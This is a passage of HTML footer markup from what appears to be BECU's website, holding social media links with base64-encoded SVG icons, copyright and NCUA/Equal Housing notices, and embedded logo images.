tLjA3LDVzMCwzLjY2LjA3LDQuOTRjLjIsNC4zNiwyLjYyLDYuNzgsNyw3LDEuMjguMDYsMS42OS4wOCw1LC4wOHMzLjY3LDAsNS0uMDhjNC4zNS0uMiw2Ljc4LTIuNjEsNy03LC4wNi0xLjI4LjA3LTEuNjguMDctNC45NHMwLTMuNjctLjA3LTVjLS4yLTQuMzUtMi42Mi02Ljc4LTctN0M3Ny4xMSwzNDAuNDgsNzYuNywzNDAuNDcsNzMuNDQsMzQwLjQ3Wm0wLDUuODNhNi4xNyw2LjE3LDAsMSwwLDYuMTYsNi4xN0E2LjE2LDYuMTYsMCwwLDAsNzMuNDQsMzQ2LjNabTAsMTAuMTdhNCw0LDAsMSwxLDQtNEE0LDQsMCwwLDEsNzMuNDQsMzU2LjQ3Wm02LjQxLTExLjg1YTEuNDQsMS40NCwwLDEsMCwxLjQ0LDEuNDRBMS40NCwxLjQ0LDAsMCwwLDc5Ljg1LDM0NC42MloiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC01MC45NCAtMzI5Ljk2KSIvPjwvZz48L3N2Zz4=" alt="B E C U's Instagram page" id=instagram-image title="BECU's Instagram page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://twitter.com/becu title="BECU's Twitter feed" id=twitter-link>
 <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NSA0NSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM0ZDYwNjk7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5JY29uX1R3aXR0ZXI8L3RpdGxlPjxnIGlkPSJ0d2l0dGVyIj48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik05My42NSwzMzIuODF2NDFoLTQxdi00MWg0MW0yLTJoLTQ1djQ1aDQ1di00NVoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC01MC42NSAtMzMwLjgxKSIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTg0Ljc4LDM0Ni4xYTkuNDMsOS40MywwLDAsMS0yLjc0Ljc1LDQuODEsNC44MSwwLDAsMCwyLjEtMi42NCw5LjQ5LDkuNDksMCwwLDEtMywxLjE2QTQuNzcsNC43NywwLDAsMCw3MywzNDkuNzJhMTMuNTYsMTMuNTYsMCwwLDEtOS44My01LDQuNzgsNC43OCwwLDAsMCwxLjQ3LDYuMzcsNC44MSw0LjgxLDAsMCwxLTIuMTYtLjYsNC43OSw0Ljc5LDAsMCwwLDMuODMsNC43NCw0Ljc0LDQuNzQsMCwwLDEtMi4xNi4wOCw0Ljc4LDQuNzgsMCwwLDAsNC40NiwzLjMyLDkuNTgsOS41OCwwLDAsMS03LjA2LDJBMTMuNTcsMTMuNTcsMCwwLDAsODIuNCwzNDguNTcsOS42NCw5LjY0LDAsMCwwLDg0Ljc4LDM0Ni4xWiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTUwLjY1IC0zMzAuODEpIi8+PC9nPjwvc3ZnPg==" alt="B E C U's Twitter feed" id=twitter-image title="BECU's Twitter feed" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.pinterest.com/becu/ title="BECU's Pinterest page" id=pinterest-link>
 <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NSA0NSI+PGRlZnM+PHN0eWxlPi5jbHMtMSwuY2xzLTJ7ZmlsbDojNGQ2MDY5O30uY2xzLTJ7ZmlsbC1ydWxlOmV2ZW5vZGQ7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5JY29uX1BpbnRlcmVzdDwvdGl0bGU+PGcgaWQ9InBpbnRlcmVzdCI+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNOTMuNDgsMzMydjQxaC00MVYzMzJoNDFtMi0yaC00NXY0NWg0NVYzMzBaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNTAuNDggLTMyOS45NikiLz48cGF0aCBjbGFzcz0iY2xzLTIiIGQ9Ik03MywzNDAuNDdhMTIsMTIsMCwwLDAtNC4zNywyMy4xNywxMS4zNywxMS4zNywwLDAsMSwwLTMuNDRsMS40MS02YTQuMjcsNC4yNywwLDAsMS0uMzYtMS43OGMwLTEuNjcsMS0yLjkxLDIuMTctMi45MWExLjUxLDEuNTEsMCwwLDEsMS41MiwxLjY5LDIzLjg4LDIzLjg4LDAsMCwxLTEsNCwxLjc0LDEuNzQsMCwwLDAsMS43OCwyLjE3YzIuMTMsMCwzLjc3LTIuMjUsMy43Ny01LjQ5YTQuNzMsNC43MywwLDAsMC01LTQuODgsNS4yLDUuMiwwLDAsMC01LjQyLDUuMkE0LjcxLDQuNzEsMCwwLDAsNjguNCwzNTVhLjM2LjM2LDAsMCwxLC4wOS4zNWwtLjM0LDEuMzZjLS4wNS4yMi0uMTcuMjYtLjQuMTYtMS41LS43LTIuNDMtMi44OS0yLjQzLTQuNjUsMC0zLjc5LDIuNzUtNy4yNiw3LjkzLTcuMjYsNC4xNiwwLDcuMzksMyw3LjM5LDYuOTMsMCw0LjEzLTIuNiw3LjQ2LTYuMjIsNy40NmEzLjIsMy4yLDAsMCwxLTIuNzUtMS4zOGwtLjc1LDIuODZhMTMuMjEsMTMuMjEsMCwwLDEtMS40OSwzLjE0LDExLjg3LDExLjg3LDAsMCwwLDMuNTUuNTQsMTIsMTIsMCwxLDAsMC0yNFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC01MC40OCAtMzI5Ljk2KSIvPjwvZz48L3N2Zz4=" alt="B E C U's Pinterest page" id=pinterest-image title="BECU's Pinterest page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.linkedin.com/company/becu title="BECU's LinkedIn page" id=linkedin-link>
 <img src=data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NSA0NSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM0ZDYwNjk7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5JY29uX0xpbmtlZEluPC90aXRsZT48ZyBpZD0ibGlua2VkaW4iPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTk0LjIxLDMzMi40OHY0MWgtNDF2LTQxaDQxbTItMmgtNDV2NDVoNDV2LTQ1WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTUxLjIgLTMzMC40OCkiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik02Ny4zMSwzNDQuNzlhMi4yNiwyLjI2LDAsMSwxLTIuMjUtMi4yOEEyLjI2LDIuMjYsMCwwLDEsNjcuMzEsMzQ0Ljc5Wm0wLDQuMUg2Mi43OHYxNC41Nmg0LjU1Wm03LjI3LDBINzAuMDh2MTQuNTZINzQuNlYzNTUuOGMwLTQuMjUsNS40OS00LjU5LDUuNDksMHY3LjY1aDQuNTR2LTkuMjJjMC03LjE4LTguMTItNi45MS0xMC0zLjM4WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTUxLjIgLTMzMC40OCkiLz48L2c+PC9zdmc+ id=linkedin-image alt="B E C U's LinkedIn page" title="BECU's LinkedIn page" class=social-image></a></li>
 <li class=social-item>
 <a tabindex=0 href=https://www.youtube.com/user/BECUVideo id=youtube-link title="BECU's YouTube page">
 <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NSA0NSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM0ZDYwNjk7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5JY29uX1lvdVR1YmU8L3RpdGxlPjxnIGlkPSJ5b3V0dWJlIj48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0zMjYuNDIsMzc1LjgxdjQxaC00MXYtNDFoNDFtMi0yaC00NXY0NWg0NXYtNDVaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMjgzLjQyIC0zNzMuODEpIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMzEzLjc5LDM4Ny4yYy0zLjcyLS4yNS0xMi0uMjUtMTUuNzQsMC00LC4yOC00LjUsMi43MS00LjUzLDkuMTFzLjUsOC44NCw0LjUzLDkuMTJjMy43Mi4yNSwxMiwuMjUsMTUuNzQsMCw0LS4yOCw0LjUtMi43MSw0LjUzLTkuMTJTMzE3LjgyLDM4Ny40OCwzMTMuNzksMzg3LjJabS0xMSwxMy4yNXYtOC4yN2w4LjI3LDQuMTNaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMjgzLjQyIC0zNzMuODEpIi8+PC9nPjwvc3ZnPg==" id=youtube-image alt="B E C U's YouTube page" title="BECU's YouTube page" class=social-image>
 </a></li>
 </ul> 
 </div>
 
 <div id=footer-legal class=footer-legal>
 <ul class=footer-copyright>
 <li>
 <div class=flex-display>
 <div class=ncua-text>
 <span id=ncua-text> 
 
 © 2020 BECU. All Rights Reserved. Federally Insured by NCUA. 
 </span>
 
 
 <span id=ehol-text> 
 Equal Housing Opportunity Lender
 </span>
 </div> 
 <div class=footer-ncua-ehol-container>
 <img id=ehol-logo class=ehol-logo title="We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act" alt="We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act" src=data:image/png;base64,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>
 <img id=ncua-logo class=ncua-logo title="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency." alt="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. NCUA. National Credit Union Administration, a U.S. Government Agency." src="data:image/png;base64,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